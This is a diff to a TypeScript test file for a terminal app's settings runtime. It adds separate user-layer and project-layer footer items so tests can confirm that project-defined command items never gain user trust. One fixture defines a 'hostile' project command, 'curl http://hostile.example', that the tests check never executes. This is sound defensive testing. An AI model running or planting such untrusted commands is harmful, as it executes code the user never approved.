@@ -46,13 +46,25 @@ interface TestDoc {
  * The structural Host context: a settings service whose `tui-app` descriptor
  * carries a MERGED value and a USER section. This is the same seam
  * `DirectConfigPort` reads in production; nothing else is stubbed.
+ *
+ * `projectItems` populates the MERGED value ONLY — a hostile project layer's
+ * definitions. `userItems` populates the USER section ONLY — the layer the
+ * semantic reads trust. Keeping them separate is what makes the trust
+ * boundary testable: a project-only command item must never surface through
+ * the USER-layer semantic read.
  */
-function hostContext(doc: TestDoc, options: { readonly projectItems?: readonly unknown[] } = {}): HostContextLike {
+function hostContext(doc: TestDoc, options: {
+  readonly projectItems?: readonly unknown[]
+  readonly userItems?: readonly unknown[]
+} = {}): HostContextLike {
   const settings: SettingsServiceLike = {
     describe: () => [{
       ns: 'tui-app',
-      value: { ...doc, ...(options.projectItems === undefined ? {} : { footerCustomItems: [...options.projectItems] }) },
-      user: options.projectItems === undefined ? undefined : { footerCustomItems: [...options.projectItems] },
+      value: {
+        ...doc,
+        ...(options.projectItems === undefined ? {} : { footerCustomItems: [...options.projectItems] }),
+      },
+      user: options.userItems === undefined ? undefined : { footerCustomItems: [...options.userItems] },
       revision: 1,
     }],
     mutate: async () => {
@@ -81,7 +93,7 @@ interface RuntimeHarness {
 }
 
 /** Mount the REAL SettingsRuntime over the REAL DirectConfigPort. */
-function mountRuntime(doc: TestDoc, options: { readonly projectItems?: readonly unknown[]; readonly surfaceApp?: object } = {}): RuntimeHarness {
+function mountRuntime(doc: TestDoc, options: { readonly projectItems?: readonly unknown[]; readonly userItems?: readonly unknown[]; readonly surfaceApp?: object } = {}): RuntimeHarness {
   let reads = 0
   let trustReads = 0
   const baseCtx = hostContext(doc, options)
@@ -218,7 +230,7 @@ test('the REAL Direct chain projects a custom USER config onto the native wire t
     const { createSurfaceRuntime } = await import('../../src/app/surface/runtime.ts')
     const { runtime } = mountRuntime(
       { footer: 'custom', footerLayout: CUSTOM_LAYOUT },
-      { projectItems: [{ schemaVersion: 1, id: 'user:environment', kind: 'text', text: 'prod-cluster' }] },
+      { userItems: [{ schemaVersion: 1, id: 'user:environment', kind: 'text', text: 'prod-cluster' }] },
     )
     // THE production decision→selection→mount chain: the resolver is the
     // settings owner's own; the connector and selection seam are the shipped
@@ -321,6 +333,10 @@ test('a merged PROJECT command config with no USER trust never executes and surf
     const { selectRendererMount, productionTspConnector } = await import('../../src/app/bootstrap/renderer-selection.ts')
     const { createSurfaceRuntime } = await import('../../src/app/surface/runtime.ts')
     const projectCommand = { schemaVersion: 1 as const, id: 'user:clock', kind: 'command' as const, command: 'curl http://hostile.example', refreshIntervalMs: 1000 }
+    // PROJECT-ONLY: the hostile command definition lives in the MERGED
+    // (project-layer) value; the USER section carries NOTHING. This is the
+    // D-U18 shape — the USER semantic read must answer empty, so the
+    // projection can never classify the project item as a USER command.
     const { runtime, portReads } = mountRuntime(
       {
         footer: 'command',
@@ -330,8 +346,14 @@ test('a merged PROJECT command config with no USER trust never executes and surf
         footerLayout: { schemaVersion: 1, rows: [] },
         footerCustomItems: [projectCommand],
       },
-      { projectItems: [projectCommand] },
+      { projectItems: [projectCommand], userItems: undefined },
     )
+    // The trust boundary precondition: the USER-layer semantic read sees NO
+    // command definition at all (the project item never crossed the boundary).
+    const userRead = runtime.resolveTspFooterConfig()
+    assert.equal(userRead.userCommandIds.size, 0, 'the PROJECT command item never became a USER command id')
+    assert.deepEqual(userRead.userTextItems, [], 'the USER text projection is empty')
+    assert.ok(!JSON.stringify(userRead).includes('curl'), 'the hostile command string never entered the projection')
     const mount = await selectRendererMount({
       log: () => {},
       env: { DSH_PI_TUI_RENDERER: 'tsp' },
@@ -573,7 +595,7 @@ test('the same config snapshot serves session switches and repaints (no per-fram
     const session = await openOn(pane)
     const { runtime, userItemReads } = mountRuntime(
       { footer: 'custom', footerLayout: CUSTOM_LAYOUT },
-      { projectItems: [{ schemaVersion: 1, id: 'user:environment', kind: 'text', text: 'stable-value' }] },
+      { userItems: [{ schemaVersion: 1, id: 'user:environment', kind: 'text', text: 'stable-value' }] },
     )
     const config = runtime.resolveTspFooterConfig()
     const readsAtBind = userItemReads()
